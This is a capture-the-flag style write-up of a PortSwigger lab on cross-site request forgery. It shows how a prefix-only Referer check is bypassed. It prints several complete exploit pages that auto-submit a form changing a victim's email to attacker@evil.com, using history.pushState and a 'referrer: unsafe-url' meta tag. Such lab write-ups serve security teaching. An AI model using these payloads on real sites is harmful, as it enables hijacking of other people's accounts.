# CSRF with broken Referer validation

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-referer-validation-broken), you'll learn: CSRF with broken Referer validation! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052029.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052052.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052057.png)

In the previous labs, we found that the email change functionality is vulnerable to CSRF.

**Let's inspect that HTML form:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <button class='button' type='submit'> Update email </button>
</form>
```

In here, we can see that there is **no CSRF token**.

**Now, we can use the `exploit serevr` to test CSRF attack:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052342.png)

**Then, we can craft a HTML form that performs CSRF attack on the victim:**
```html
<html>
    <head>
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**To test is will work or not, I'll use the `View exploit` button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052529.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052546.png)

However, it outputs an error: `Invalid referer header`.

**In the previous lab, we bypass that check with a `<meta>` tag:**
```html
<html>
    <head>
        <meta name="referrer" content="no-referrer">
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Let's try that again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052723.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215052738.png)

Hmm... We still get an `Invalid referer header` error.

**This got me thinking: Is the application validates that the domain in the `Referer` starts with the expected value??**

**Let's check that in Burp Suite's Repeater:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215053511.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215053540.png)

**In here, we can try to send a different URL in the `Referer` header:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215053634.png)

**Then, what if I try to append a GET parameter after the expected value?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054242.png)

It still works!

**That being said, the application is checking the domain in the `Referer` starts with the expected value!**

**According the [Mozilla web docs](https://developer.mozilla.org/en-US/docs/Web/API/History/pushState), we can use a JavaScript function called `history.pushState()`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054430.png)

**To bypass that check, we can add the `history.pushState()` function in our exploit:**
```html
<html>
    <head>
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            history.pushState('', '', '/?0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>
```

This will cause the `Referer` header in the generated request to contain the URL of the target site in the query string.

However, this still couldn't work, as many browsers now strip the query string from the Referer header by default as a security measure.

**To bypass that, we can just add a new `<meta>` tag to override that behavior and ensure that the full URL is included in the request:**
```html
<html>
    <head>
        <meta name="referrer" content="unsafe-url">
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            history.pushState('', '', '/?0a9400bc039e5e9ac050dc50005c009b.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Finally, we can send this exploit to a victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054941.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-12/images/Pasted%20image%2020221215054955.png)

We successfully changed a victim email address!

# What we've learned:

1. CSRF with broken Referer validation